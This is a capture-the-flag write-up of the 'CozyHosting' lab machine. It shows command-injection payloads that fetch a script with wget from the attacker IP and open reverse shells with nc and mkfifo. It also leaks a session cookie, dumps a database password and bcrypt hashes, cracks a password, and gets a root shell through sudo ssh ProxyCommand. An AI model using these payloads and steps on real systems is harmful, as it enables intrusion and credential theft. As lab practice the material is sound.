




└─$ sudo dirsearch -u http://cozyhosting.htb/  
Target: http://cozyhosting.htb/

[10:41:29] Starting: 
[10:41:49] 200 -    0B  - /;admin/
[10:41:49] 200 -    0B  - /;/json
[10:41:49] 200 -    0B  - /;/login
[10:41:49] 400 -  435B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
[10:41:49] 200 -    0B  - /;login/
[10:41:49] 200 -    0B  - /;/admin
[10:41:49] 200 -    0B  - /;json/
[10:41:50] 400 -  435B  - /a%5c.aspx
[10:41:53] 200 -    0B  - /actuator/;/caches
[10:41:53] 200 -    0B  - /actuator/;/auditevents
[10:41:53] 200 -    0B  - /actuator/;/conditions
[10:41:53] 200 -    0B  - /actuator/;/configprops
[10:41:53] 200 -    0B  - /actuator/;/beans
[10:41:53] 200 -    0B  - /actuator/;/auditLog
[10:41:53] 200 -  634B  - /actuator
[10:41:53] 200 -    0B  - /actuator/;/configurationMetadata
[10:41:53] 200 -    0B  - /actuator/;/env
snip...
[10:41:53] 200 -    0B  - /actuator/;/mappings
[10:41:53] 200 -    0B  - /actuator/;/resolveAttributes
[10:41:53] 200 -    0B  - /actuator/;/sessions
[10:41:53] 200 -    0B  - /actuator/;/statistics
[10:41:53] 200 -    0B  - /actuator/;/trace
[10:41:53] 200 -    0B  - /actuator/;/threaddump
[10:41:53] 200 -    0B  - /actuator/;/status
[10:41:54] 200 -    5KB - /actuator/env
[10:41:54] 200 -   15B  - /actuator/health
[10:41:54] 200 -  124KB - /actuator/beans
[10:41:54] 200 -   10KB - /actuator/mappings
[10:41:54] 200 -   98B  - /actuator/sessions


http://cozyhosting.htb/actuator

{"_links":{"self":{"href":"http://localhost:8080/actuator","templated":false},"sessions":{"href":"http://localhost:8080/actuator/sessions","templated":false},"beans":{"href":"http://localhost:8080/actuator/beans","templated":false},"health":{"href":"http://localhost:8080/actuator/health","templated":false},"health-path":{"href":"http://localhost:8080/actuator/health/{*path}","templated":true},"env":{"href":"http://localhost:8080/actuator/env","templated":false},"env-toMatch":{"href":"http://localhost:8080/actuator/env/{toMatch}","templated":true},"mappings":{"href":"http://localhost:8080/actuator/mappings","templated":false}}}


http://cozyhosting.htb/actuator/sessions
{"99FF8168DDE22F6D6AC5212D721FF7EC":"kanderson"}


http://cozyhosting.htb/actuator/env

from cloudhosting-0.0.1.jar - 8:21"},"spring.datasource.platform":{"value":"******","origin":"class path resource [application.properties] from cloudhosting-0.0.1.jar - 9:28"},"spring.datasource.url":{"value":"******","origin":"class path resource [application.properties] from cloudhosting-0.0.1.jar - 10:23"},"spring.datasource.username":{"value":"******","origin":"class path resource [application.properties] from cloudhosting-0.0.1.jar - 11:28"},"spring.datasource.password":{"value":"******","origin":"class path resource [application.properties] from cloudhosting-0.0.1.jar - 12:28"}}}]}


set cookie as kenderson, login to admin page.

use burp s catch the form POST request:
after try the fields,


POST /executessh HTTP/1.1
Host: cozyhosting.htb
Content-Length: 40
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://cozyhosting.htb
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://cozyhosting.htb/admin?error=Username%20can%27t%20contain%20whitespaces!
Accept-Encoding: gzip, deflate, br
Cookie: JSESSIONID=86F0B5AAEB63D5C60CB6B4E5DB222573
Connection: keep-alive

host=a&username=d%3B+ping+10.10.16.25%3B


└─$ sudo tcpdump -i tun0                              
[sudo] password for ed: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
11:53:56.987674 IP 10.10.16.25.49122 > cozyhosting.htb.http: Flags [S], seq 316614456, win 64240, options [mss 1460,sackOK,TS val 1696286633 ecr 0,nop,wscale 7], length 0
11:53:57.081790 IP cozyhosting.htb.http > 10.10.16.25.49122: Flags [S.], seq 4247847827, ack 316614457, win 65160, options [mss 1346,sackOK,TS val 4140112968 ecr 1696286633,nop,wscale 7], length 0
11:53:57.081826 IP 10.10.16.25.49122 > cozyhosting.htb.http: Flags [.], ack 1, win 502, options [nop,nop,TS val 1696286727 ecr 4140112968], length 0
11:53:57.082065 IP 10.10.16.25.49122 > cozyhosting.htb.http: Flags [P.], seq 1:745, ack 1, win 502, options [nop,nop,TS val 1696286727 ecr 4140112968], length 744: HTTP: POST /executessh HTTP/1.1
11:53:57.164582 IP cozyhosting.htb.http > 10.10.16.25.49122: Flags [.], ack 745, win 504, options [nop,nop,TS val 4140113053 ecr 1696286727], length 0


host=a&username=localhost%3B${IFS}wget${IFS}http%3A%2F%2F10.10.16.25%2Fa.sh${IFS}-O${IFS}%2Ftmp%2Fa.sh;#

└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.9.229 - - [01/Jul/2026 12:02:56] "GET /a.sh HTTP/1.1" 200 -

host=a&username=d%3bnc${IFS}10.10.16.25${IFS}8822${IFS}-e${IFS}bash


host=a&username=d%3brm${IFS}/tmp/f;mkfifo${IFS}/tmp/f;cat${IFS}/tmp/f|bash${IFS}-i${IFS}2>&1|nc${IFS}10.10.16.25${IFS}8822${IFS}>/tmp/f

host=a&username=localhost%3B${IFS}wget${IFS}http%3A%2F%2F10.10.16.25%2Fa.sh${IFS}-O${IFS}%2Ftmp%2Fb.sh

host=a&username=d%3Bchmod${IFS}777${IFS}/tmp/b.sh

host=a&username=d%3B$bash${IFS}/tmp/b.sh


└─$ nc -nvlp 8822            
listening on [any] 8822 ...
connect to [10.10.16.25] from (UNKNOWN) [10.129.9.229] 59588
sh: 0: can't access tty; job control turned off
$ id
uid=1001(app) gid=1001(app) groups=1001(app)

$ python3 -c "import pty;pty.spawn('/bin/bash')"
app@cozyhosting:/app$ 

app@cozyhosting:/app$ ls
ls
cloudhosting-0.0.1.jar

app@cozyhosting:/app$ ps -auxf | grep cloudh
ps -auxf | grep cloudh
app         1000  2.5  9.6 3649268 384636 ?      Ssl  14:38   2:44 /usr/bin/java -jar cloudhosting-0.0.1.jar
app         2011  0.0  0.0   6476  2324 pts/0    S+   16:26   0:00                  \_ grep cloudh

app@cozyhosting:/app$ nc 10.10.16.25 8823 < cloudhosting-0.0.1.jar
nc 10.10.16.25 8823 < cloudhosting-0.0.1.jar

sue jd-gui

BOOT-INF.classes.application.properties

server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR

app@cozyhosting:/app$ psql -U postgres -h localhost
psql -U postgres -h localhost
Password for user postgres: Vg&nvzAQ7XxR

psql (14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=#

postgres=# \list
\list
WARNING: terminal is not fully functional
Press RETURN to continue 

                                   List of databases
    Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privil
eges   
-------------+----------+----------+-------------+-------------+----------------
-------
 cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres    
      +
             |          |          |             |             | postgres=CTc/po
stgres
 template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres    
      +
             |          |          |             |             | postgres=CTc/po
stgres
(4 rows)

postgres=# \c cozyhosting
\c cozyhosting
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "cozyhosting" as user "postgres".
cozyhosting=# \dt
\dt
WARNING: terminal is not fully functional
Press RETURN to continue 

         List of relations
 Schema | Name  | Type  |  Owner   
--------+-------+-------+----------
 public | hosts | table | postgres
 public | users | table | postgres
(2 rows)

ozyhosting=# select * from users;
select * from users;
WARNING: terminal is not fully functional
Press RETURN to continue 

   name    |                           password                           | role
  
-----------+--------------------------------------------------------------+-----
--
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admi
n
(2 rows)

$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited

s -la /home
total 12
drwxr-xr-x  3 root root 4096 May 18  2023 .
drwxr-xr-x 19 root root 4096 Aug 14  2023 ..
drwxr-x---  3 josh josh 4096 Aug  8  2023 josh

josh@cozyhosting:/app$ id
id
uid=1003(josh) gid=1003(josh) groups=1003(josh)

josh@cozyhosting:~$ sudo -l
sudo -l
[sudo] password for josh: manchesterunited

Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *

josh@cozyhosting:~$ sudo ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
sudo ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
# id
id
uid=0(root) gid=0(root) groups=0(root)
